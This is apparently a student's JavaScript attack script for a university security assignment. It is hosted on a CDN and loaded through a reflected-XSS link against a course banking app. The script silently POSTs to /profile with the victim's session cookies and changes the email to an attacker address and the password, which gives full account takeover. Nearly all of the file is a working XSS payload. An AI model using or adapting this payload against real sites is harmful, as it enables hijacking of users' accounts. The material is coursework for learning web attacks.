// FIT5003 A2 - Part B.2 : externally-hosted attack script (Student 35884932)
// Hosted this on my own GitHub repo and load it via the jsDelivr CDN:
//   https://cdn.jsdelivr.net/gh/Rakib-0077/devbank-xss@main/evil.js
// Loaded via the reflected-XSS crafted URL, this runs in the VICTIM's
// authenticated session and silently changes their email + password,
// giving the attacker full account takeover (no CSRF token is required).
fetch("/profile", {
  method: "POST",
  headers: { "Content-Type": "application/x-www-form-urlencoded" },
  body: "email=attacker@evil.com&password=hacked-by-35884932",
  credentials: "include"
}).then(function () {
  console.log("[evil.js] victim account taken over");
});
